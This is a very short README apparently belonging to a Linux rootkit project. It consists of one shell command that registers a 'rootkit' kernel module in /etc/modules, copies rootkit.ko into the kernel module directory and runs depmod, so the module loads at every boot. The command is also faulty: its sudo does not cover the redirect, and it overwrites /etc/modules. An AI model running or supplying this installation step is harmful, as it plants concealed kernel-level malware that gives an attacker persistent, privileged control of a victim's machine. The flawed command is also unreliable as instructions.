# linux-rootkit

sudo echo "rootkit" > /etc/modules && kv=$(uname -r) && cp rootkit.ko /lib/modules/$kv/kernel && depmod -a
